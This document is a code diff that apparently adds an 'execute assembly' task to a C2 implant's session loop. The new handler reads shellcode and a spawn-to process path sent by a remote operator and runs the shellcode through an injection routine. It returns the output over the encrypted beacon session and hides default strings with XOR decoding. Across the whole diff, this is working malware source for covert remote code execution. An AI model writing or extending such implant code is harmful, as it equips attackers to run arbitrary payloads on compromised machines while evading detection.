@@ -12,6 +12,7 @@
 #include "builtin.h"
 #include "shell.h"
 #include "transfer.h"
+#include "assembly.h"
 #include "socks.h"
 #include <stdio.h>
 
@@ -347,6 +348,40 @@ void session_loop(SOCKET sock, uint8_t *session_key, uint32_t beacon_id,
             extern SOCKET g_socks_sock;
             if (g_socks_sock != INVALID_SOCKET) {
                 fnClosesocket(g_socks_sock);
+            }
+        }
+        else if (hdr.type == TASK_EXEC_ASSEMBLY && task_data && task_data_len >= 8) {
+            uint32_t sc_len = (uint32_t)task_data[0]
+                | ((uint32_t)task_data[1] << 8)
+                | ((uint32_t)task_data[2] << 16)
+                | ((uint32_t)task_data[3] << 24);
+            const uint8_t *sc = task_data + 4;
+            if (4 + sc_len + 4 <= task_data_len) {
+                uint32_t sp_off = 4 + sc_len;
+                uint32_t sp_len = (uint32_t)task_data[sp_off]
+                    | ((uint32_t)task_data[sp_off+1] << 8)
+                    | ((uint32_t)task_data[sp_off+2] << 16)
+                    | ((uint32_t)task_data[sp_off+3] << 24);
+                char spawnto_a[MAX_PATH] = {0};
+                if (sp_len > 0 && sp_len < MAX_PATH && sp_off + 4 + sp_len <= task_data_len) {
+                    memcpy(spawnto_a, task_data + sp_off + 4, sp_len);
+                } else {
+                    char _def[ENC_EXEC_ASM_SPAWNTO_LEN + 1];
+                    xor_dec(_def, ENC_EXEC_ASM_SPAWNTO, ENC_EXEC_ASM_SPAWNTO_LEN);
+                    _snprintf(spawnto_a, sizeof(spawnto_a) - 1, "%s", _def);
+                }
+                wchar_t spawnto_w[MAX_PATH] = {0};
+                fnMultiByteToWideChar(65001 /*CP_UTF8*/, 0, spawnto_a, -1, spawnto_w, MAX_PATH);
+
+                char output[EXEC_ASM_MAX_OUTPUT] = {0};
+                exec_assembly(sc, sc_len, spawnto_w, output, sizeof(output));
+                send_result_session(sock, hdr.label, TASK_EXEC_ASSEMBLY, CODE_EXEC_ASSEMBLY,
+                                    FLAG_NONE, output, session_key);
+            } else {
+                char _me[ENC_EXEC_ASM_ERR_INJECT_LEN + 1];
+                xor_dec(_me, ENC_EXEC_ASM_ERR_INJECT, ENC_EXEC_ASM_ERR_INJECT_LEN);
+                send_result_session(sock, hdr.label, TASK_EXEC_ASSEMBLY, CODE_EXEC_ASSEMBLY,
+                                    FLAG_ERROR, _me, session_key);
             }
         }
         else if (hdr.type == TASK_EXIT) {
